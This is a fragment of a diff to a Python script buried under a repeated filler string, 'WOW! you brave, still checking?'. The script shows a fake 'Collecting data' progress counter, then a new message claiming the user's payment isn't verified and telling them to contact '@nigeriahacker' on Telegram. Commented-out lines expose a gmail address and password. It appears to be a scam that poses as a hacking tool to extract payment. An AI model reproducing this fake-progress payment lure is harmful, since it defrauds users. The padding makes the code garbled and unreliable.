                  '''WOW! you brave, still checking?'''
+    
+                 '''WOW! you brave, still checking?'''
+                 sp(0.8)
 
                  '''WOW! you brave, still checking?'''
-                 sp(0.6)
-
-                 '''WOW! you brave, still checking?'''
-
+    
                  '''WOW! you brave, still checking?'''
                  if j%2==0:
 
                    '''WOW! you brave, still checking?'''
-
+    
                    '''WOW! you brave, still checking?'''
                    print(r+"Collecting data...\\")
 
                    '''WOW! you brave, still checking?'''
-
+    
                    '''WOW! you brave, still checking?'''
                  if j%2==1:
 
                   '''WOW! you brave, still checking?'''
-
+    
                   '''WOW! you brave, still checking?'''
                   for k in range(1,100,1):
 
                    '''WOW! you brave, still checking?'''
-
+    
                    '''WOW! you brave, still checking?'''
                    print(" ")
 
                    '''WOW! you brave, still checking?'''
-
+    
                    '''WOW! you brave, still checking?'''
                    print(g+"Collected "+y+str(k)+"%")
 
                    '''WOW! you brave, still checking?'''
-
+    
                    '''WOW! you brave, still checking?'''
        #     print(g+" ")
         #    print(r+"                              SUCCESSFULLY")
         #    print(r+"                    name: "+g+"sky lord\ngmail: skylord475@gmail.com")
           #  print(r+"                    password: "+g+"1sthacker1")
             '''WOW! you brave, still checking?'''
+    
+            '''WOW! you brave, still checking?'''
+            print(r+"Your payment isn't verified")
+            print("Contact @nigeriahacker in telegram")
 
             '''WOW! you brave, still checking?'''
-            print(r+"Your login details failed")
-            print("Wrong password")
-
-            '''WOW! you brave, still checking?'''
-
+    
             '''WOW! you brave, still checking?'''
             sys.exit()
 
             '''WOW! you brave, still checking?'''
-
+    
             '''WOW! you brave, still checking?'''
         for i in range(1,2):
 
           '''WOW! you brave, still checking?'''
-
+    
           '''WOW! you brave, still checking?'''
-          await man()
+          await man()               
 
           """ '''WOW! you brave, still checking?'''
-
+    
               '''WOW! you brave, still checking?'''
               elif a == "1" :
 
               '''WOW! you brave, still checking?'''
+    
+              '''WOW! you brave, still checking?'''
+              
 
               '''WOW! you brave, still checking?'''
-
-
-              '''WOW! you brave, still checking?'''
-
+    
               '''WOW! you brave, still checking?'''
               elif a == "2" :
 
          '''WOW! you brave, still checking?'''
+    
+         '''WOW! you brave, still checking?'''
+              
 
          '''WOW! you brave, still checking?'''
-
-
-         '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               elif a == "3" :
 
          '''WOW! you brave, still checking?'''
+    
+         '''WOW! you brave, still checking?'''
+              
 
          '''WOW! you brave, still checking?'''
-
-
-         '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               elif a == "4" :
 
          '''WOW! you brave, still checking?'''
+    
+         '''WOW! you brave, still checking?'''
+              
 
          '''WOW! you brave, still checking?'''
-
-
-         '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               elif a == "5" :
 
          '''WOW! you brave, still checking?'''
+    
+         '''WOW! you brave, still checking?'''
+              
 
          '''WOW! you brave, still checking?'''
-
-
-         '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               elif a == "6" :
 
          '''WOW! you brave, still checking?'''
+    
+         '''WOW! you brave, still checking?'''
+              
 
          '''WOW! you brave, still checking?'''
-
-
-         '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               elif a == "7" :
 
          '''WOW! you brave, still checking?'''
+    
+         '''WOW! you brave, still checking?'''
+              
 
          '''WOW! you brave, still checking?'''
-
-
-         '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               elif a == "8" :
 
          '''WOW! you brave, still checking?'''
+    
+         '''WOW! you brave, still checking?'''
+              
 
          '''WOW! you brave, still checking?'''
-
-
-         '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               elif a == "9" :
 
          '''WOW! you brave, still checking?'''
+    
+         '''WOW! you brave, still checking?'''
+              
 
          '''WOW! you brave, still checking?'''
-
-
-         '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               elif a == "a" :
 
          '''WOW! you brave, still checking?'''
+    
+         '''WOW! you brave, still checking?'''
+              
 
          '''WOW! you brave, still checking?'''
-
-
-         '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               elif a == "b" :
 
     while True:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
          await man()
 
